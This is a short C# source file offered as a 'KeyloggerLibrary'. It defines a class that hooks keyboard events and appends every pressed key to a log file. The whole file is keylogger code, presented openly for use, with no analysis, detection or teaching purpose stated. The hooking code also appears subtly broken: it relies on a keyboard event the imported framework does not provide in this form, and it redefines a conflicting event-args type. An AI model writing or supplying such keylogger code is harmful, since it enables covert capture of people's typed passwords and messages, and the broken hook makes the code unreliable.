using System;
using System.IO;
using System.Windows.Input;

namespace KeyloggerLibrary
{
    public class Keylogger
    {
        private string logFilePath;

        // Constructor to initialize the Keylogger
        public Keylogger(string filePath)
        {
            logFilePath = filePath;

            // Subscribe to the KeyDown event
            KeyboardHook.KeyDown += OnKeyDown;
        }

        // KeyDown event handler
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            // Log the pressed keys
            LogToFile(logFilePath, e.Key.ToString());
        }

        // Method to log keystrokes to a file
        private void LogToFile(string filePath, string text)
        {
            // Append the pressed key to the log file
            using (StreamWriter sw = File.AppendText(filePath))
            {
                sw.WriteLine(text);
            }
        }
    }

    // Class for keyboard hooking
    static class KeyboardHook
    {
        // Event to handle key presses
        public static event EventHandler<KeyEventArgs> KeyDown = delegate { };

        // Static constructor to hook the keyboard
        static KeyboardHook()
        {
            // Subscribe to the Keyboard.KeyDown event
            Keyboard.KeyDown += (s, e) =>
            {
                // Invoke the KeyDown event
                KeyDown.Invoke(null, e);
            };
        }
    }

    // Custom EventArgs class to pass the pressed key
    public class KeyEventArgs : EventArgs
    {
        public Key Key { get; set; }

        public KeyEventArgs(Key key)
        {
            Key = key;
        }
    }
}
